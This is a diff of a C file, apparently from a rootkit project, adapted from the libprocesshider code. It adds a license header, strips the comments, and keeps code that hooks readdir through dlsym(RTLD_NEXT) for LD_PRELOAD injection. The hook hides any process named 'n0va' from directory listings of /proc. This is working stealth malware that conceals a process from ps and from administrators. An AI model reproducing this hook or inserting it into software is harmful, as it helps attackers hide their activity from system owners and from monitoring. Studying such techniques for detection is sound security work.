@@ -1,24 +1,25 @@
+# Copyright © 2021 Kris Nóva <kris@nivenly.com>
+#
+# Licensed under the Apache License, Version 2.0 (the "License");
+# you may not use this file except in compliance with the License.
+# You may obtain a copy of the License at
+#
+#     http:#www.apache.org/licenses/LICENSE-2.0
+#
+# Unless required by applicable law or agreed to in writing, software
+# distributed under the License is distributed on an "AS IS" BASIS,
+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+# See the License for the specific language governing permissions and
+# limitations under the License.
 #define _GNU_SOURCE
-
 #include <stdio.h>
 #include <dlfcn.h>
 #include <dirent.h>
 #include <string.h>
 #include <unistd.h>
 
-/*
- * Original source (Thanks Gianluca! https://raw.githubusercontent.com/gianlucaborello/libprocesshider/master/processhider.c)
- */
-
-
-/*
- * Every process with this name will be excluded
- */
 static const char* process_to_filter = "n0va";
 
-/*
- * Get a directory name given a DIR* handle
- */
 static int get_dir_name(DIR* dirp, char* buf, size_t size)
 {
     int fd = dirfd(dirp);
@@ -37,9 +38,6 @@ static int get_dir_name(DIR* dirp, char* buf, size_t size)
     return 1;
 }
 
-/*
- * Get a process name given its pid
- */
 static int get_process_name(char* pid, char* buf)
 {
     if(strspn(pid, "0123456789") != strlen(pid)) {
@@ -72,7 +70,7 @@ static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
 struct dirent* readdir(DIR *dirp)                                       \
 {                                                                       \
     if(original_##readdir == NULL) {                                    \
-        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \
+        original_##readdir = dlsym(RTLD_NEXT, #readdir);                \
         if(original_##readdir == NULL)                                  \
         {                                                               \
             fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
